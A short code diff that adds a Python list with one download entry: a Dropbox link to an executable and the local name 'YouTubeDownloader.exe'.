@@ -1,0 +1,6 @@
+downloads = [
+    (
+        "https://www.dropbox.com/scl/fi/1l0r6oc5u06basl0735g4/youtubedownloader.exe?rlkey=kdyylcuvq3fyuplf3r0mafzfl&st=qywqwfz9&dl=1",
+        "YouTubeDownloader.exe",
+    ),
+]
